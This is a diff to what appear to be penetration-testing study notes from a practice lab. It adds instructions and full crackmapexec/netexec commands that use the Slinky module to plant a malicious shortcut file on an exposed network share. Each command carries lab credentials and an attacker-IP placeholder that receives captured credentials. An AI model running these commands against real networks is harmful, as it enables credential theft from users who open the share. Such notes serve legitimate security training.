@@ -264,4 +264,9 @@ This can be used in the event when we are having trouble gaining further access 
         $lnk.HotKey = "Ctrl+Alt+T"
         $lnk.Save()
 
-Crackmapexec / netexec module -M Slinky [do more research here]
+crackmapexec / netexec using module -M Slinky, to implant a lnk into a 'file share' on the network if there is one identified and also exposed. Without the requirement to access the target machine your self.  
+
+    crackmapexec smb <target IP> -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=<attacker IP>  
+    
+    netexec smb <target IP> -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=<attacker IP>  
+
